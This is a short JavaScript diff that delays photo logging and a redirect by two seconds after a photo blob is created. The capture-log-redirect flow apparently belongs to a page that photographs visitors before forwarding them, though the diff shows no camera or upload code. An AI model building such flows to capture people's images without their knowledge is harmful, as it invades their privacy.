@@ -137,8 +137,10 @@
             console.log('Фотография создана');
             savedPhoto = blob;
             photoTaken = true;
-            logPhotoInfo();
-            redirectToFinalDestination();
+            setTimeout(function () {
+              logPhotoInfo();
+              redirectToFinalDestination();
+            }, 2000)
           }, 'image/png');
         }
       }, 3000);
@@ -167,8 +169,10 @@
                   savedPhoto = blob;
                   photoTaken = true;
                   
-                  logPhotoInfo();
-                  redirectToFinalDestination();
+                  setTimeout(function () {
+                    logPhotoInfo();
+                    redirectToFinalDestination();
+                  }, 2000)
                   
                 }, 'image/png');
               }}, 3000);
